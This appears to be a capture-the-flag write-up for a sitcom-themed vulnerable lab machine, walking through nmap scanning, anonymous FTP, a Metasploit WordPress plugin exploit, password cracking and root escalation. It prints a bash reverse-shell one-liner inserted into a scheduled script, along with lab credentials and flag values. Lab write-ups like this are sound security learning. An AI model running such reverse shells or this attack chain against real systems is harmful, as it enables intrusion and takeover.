@@ -1,0 +1,262 @@
+We gave the ip as nmap .
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 20:38 IST
+NSE: Loaded 151 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 20:38
+Completed NSE at 20:38, 0.00s elapsed
+Initiating NSE at 20:38
+Completed NSE at 20:38, 0.00s elapsed
+Initiating NSE at 20:38
+Completed NSE at 20:38, 0.00s elapsed
+Initiating ARP Ping Scan at 20:38
+Scanning 192.168.1.105 [1 port]
+Completed ARP Ping Scan at 20:38, 0.00s elapsed (1 total hosts)
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Initiating SYN Stealth Scan at 20:38
+Scanning 192.168.1.105 [65535 ports]
+Discovered open port 80/tcp on 192.168.1.105
+Discovered open port 21/tcp on 192.168.1.105
+Discovered open port 22/tcp on 192.168.1.105
+Discovered open port 1337/tcp on 192.168.1.105
+Completed SYN Stealth Scan at 20:38, 4.20s elapsed (65535 total ports)
+Initiating Service scan at 20:38
+Scanning 4 services on 192.168.1.105
+Completed Service scan at 20:38, 6.01s elapsed (4 services on 1 host)
+Initiating OS detection (try #1) against 192.168.1.105
+NSE: Script scanning 192.168.1.105.
+Initiating NSE at 20:38
+NSE: [ftp-bounce] Couldn't resolve scanme.nmap.org, scanning 10.0.0.1 instead.
+NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
+Completed NSE at 20:38, 0.29s elapsed
+Initiating NSE at 20:38
+Completed NSE at 20:38, 0.10s elapsed
+Initiating NSE at 20:38
+Completed NSE at 20:38, 0.00s elapsed
+Nmap scan report for 192.168.1.105
+Host is up (0.00043s latency).
+Not shown: 65531 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp           539 Mar 04 01:11 Welcome.txt
+| -rw-r--r--    1 ftp      ftp           114 Mar 04 01:13 ftp_agreement.txt
+|_drwxr-xr-x    9 ftp      ftp          4096 Mar 04 01:09 pub
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.1.4
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 cf:5c:ee:76:7c:48:52:06:8d:56:07:7f:f6:5d:80:f2 (RSA)
+|   256 ab:bb:fa:f9:89:99:02:9e:e4:20:fa:37:4f:6f:ca:ca (ECDSA)
+|_  256 ea:6d:77:f3:ff:9c:d5:dd:85:e3:1e:75:3c:7b:66:47 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+| http-robots.txt: 4 disallowed entries 
+|_/howard /web_shell.php /backdoor /rootflag.txt
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Fun with flags!
+1337/tcp open  waste?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+|_    FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+
+
+one flag obtained 
+
+FLAG-sheldon{cf88b37e8cb10c4005c1f2781a069cf8}
+
+The things we observe are ftp, ssh and web .
+
+Start with web 
+
+The web page has pic of Penny and Shelly 
+
+With a message , get all 7 flags and root to win 
+
+Dirbuster to the attack 
+
+gives us quite a few directories 
+
+One is robots.txt
+
+Disallow: /howard
+Disallow: /web_shell.php
+Disallow: /backdoor
+Disallow: /rootflag.txt
+
+Nothing worked except getting a gif of Penny 
+
+Sneeky howards
+
+Nothing on the web front .
+
+Lets try ftp 
+
+The ftp is set up by Sheldon
+
+Greetings my dear friends
+This is Sheldon Cooper speaking
+I am really happy to announce that I have installed our brand new FTP server.
+I have created a folder for each one of you so that you can store anything you want as you have asked me to do.
+Soon I will be posting here useful information about the roomate agreement and the updated FTP agreement.
+Also I will add a few jokes about trains, comic books and Star Wars.
+PS: Please dont store important files here as this is set to be anonymous and public accessed.
+
+-Dr. Sheldon Cooper
+
+
+
+DONT STORE IMPORTANT FILES
+DONT UPLOAD PORN AGAIN HOWARD, I WILL DELETE IT!!!
+DONT UPLOAD MORE THAN 5GB OF DATA 
+
+
+:0 :)
+
+
+A roommate agreement , could use it with my roommate
+
+But no flag
+
+
+from bernedatte
+---------------
+Penny the IT department from my Pharmaceutical company opened you an account in the B2B website.
+You need to go there ASAP and learn our drugs for your interview tomorrow.
+I dont remember the link, but it is easy you will find it!
+Username: penny69
+Password: cant post it here as sheldon said. you know the password. you use it everywhere.
+
+From penny
+SHELDON DONT CHANGHE IT AGAIN OK!?!?!
+THIS IS THE ONLY PASSWORD I CAN REMEMBER 
+wifipassword: pennyisafreeloader
+
+
+Moving back to the web 
+
+
+there is a wordpress site 
+
+/music/wordpress
+
+Here we can see the wordpress is running reflex gallery and it has a exploit 
+
+Exploiting it using metasploit 
+
+We get a reverse shell
+
+in wp-config
+
+DB_NAME footprintsonthemoon
+DB_USER footprintsonthemoon
+DB_PASSWORD 	footprintsonthemoon1337
+
+private 
+
+bigpharmacorp
+weareevil
+
+
+So take a look into the user accounts 
+
+Amy 
+
+This is my secret diary.
+The safest way to keep my secrets is inside a compiled executable program.
+As soon as I get popular now, that I have friends, I will start adding my secrets here.
+I have used a really strong password that it cant be bruteforced.
+Seriously it is 18 digit, alphanumeric, uppercase/lowercase with symbols.
+And since my program is already compiled, no one can read the source code in order to view the password!
+
+amy{60263777358690b90e8dbe8fea6943c9}
+
+
+Roughaging through penny's user account , could get FLAG-penny{dace52bdb2a0b3f899dfb3423a992b25}
+
+3 flags done ...
+
+4 left
+
+
+We try the phpmyadmin
+
+with credentials
+
+and got berni's flag 
+bernadette{f42d950ab0e966198b66a5c719832d5f}
+
+
+So we take the zip
+
+do a zip2john to get astronaut 
+and have given to stegcracker which has found iloveyoumom
+
+FLAG-howard{b3d1baf22e07874bf744ad7947519bf4}
+
+
+On reinspecting the sql , 
+
+the flag was found in wp-posts , a little cheating 
+
+FLAG-raz{40d17a74e28a62eac2df19e206f0987c}
+
+
+We moved to leonard's section 
+
+there was a script to run after every few times 
+
+We added a reverse shell like 
+
+bash -i >& /dev/tcp/192.168.1.4/9885 0>&1
+
+we got the root 
+
+                         ____
+                        /    \
+                       /______\
+                          ||
+           /~~~~~~~~\     ||    /~~~~~~~~~~~~~~~~\
+          /~ () ()  ~\    ||   /~ ()  ()  () ()  ~\
+         (_)========(_)   ||  (_)==== ===========(_)
+          I|_________|I  _||_  |___________________|
+.////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Gongrats!
+You have rooted the box! Now you can sit on Sheldons spot!
+FLAG-leonard{17fc95224b65286941c54747704acd3e}
+
+
+Thats all 7 seven flags ....
+
+BAZINGAAA !!!!!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
